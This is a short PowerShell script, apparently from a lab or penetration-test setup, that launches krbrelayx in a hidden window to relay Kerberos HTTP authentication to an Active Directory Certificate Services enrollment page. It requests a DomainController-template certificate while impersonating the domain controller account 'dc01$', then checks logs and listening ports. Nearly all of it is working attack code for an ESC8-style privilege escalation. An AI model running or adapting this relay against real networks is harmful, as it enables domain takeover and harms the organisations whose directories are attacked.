# Quick krbrelayx listener test (ws01) — HTTP Kerberos relay to ADCS
$py = "C:\Tools\krbrelayx-venv\Scripts\python.exe"
$outdir = "C:\Tools\cadre-attack\esc8-krb"
New-Item -ItemType Directory -Force -Path $outdir | Out-Null
$log = "$outdir\krbrelay2.log"
$err = "$outdir\krbrelay2.err"
Remove-Item $log,$err -ErrorAction SilentlyContinue
$p = Start-Process -FilePath $py -ArgumentList @(
  "C:\Tools\krbrelayx\krbrelayx.py",
  "-t","http://dc01.cadre.local/certsrv/certfnsh.asp",
  "--adcs","--template","DomainController",
  "-v","dc01$",
  "-ip","192.168.77.62"
) -WorkingDirectory "C:\Tools\cadre-attack" -PassThru -WindowStyle Hidden `
  -RedirectStandardOutput $log -RedirectStandardError $err
Start-Sleep -Seconds 15
Write-Output "pid=$($p.Id) exited=$($p.HasExited)"
Write-Output "=== log ==="
Get-Content $log -ErrorAction SilentlyContinue
Write-Output "=== err ==="
Get-Content $err -ErrorAction SilentlyContinue
netstat -ano | findstr ":80 "
netstat -ano | findstr ":445 "
if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force }
